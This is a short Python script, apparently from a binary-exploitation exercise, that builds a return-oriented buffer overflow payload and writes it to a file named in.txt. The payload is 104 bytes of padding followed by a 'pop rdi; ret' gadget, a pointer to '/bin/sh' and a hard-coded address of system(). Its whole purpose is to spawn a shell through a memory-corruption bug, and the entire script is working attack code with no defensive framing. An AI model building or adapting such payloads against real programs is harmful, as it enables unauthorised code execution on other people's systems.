#!/usr/bin/env python

from struct import *

buf = ""
buf += "A"*104                              # junk
buf += pack("<Q", 0x0000000000400673)       # pop rdi; ret;
buf += pack("<Q", 0x4006cf)                 # pointer to "/bin/sh" gets popped into rdi
buf += pack("<Q", 0x7ffff7a744f0)           # address of system()

f = open("in.txt", "w")
f.write(buf)


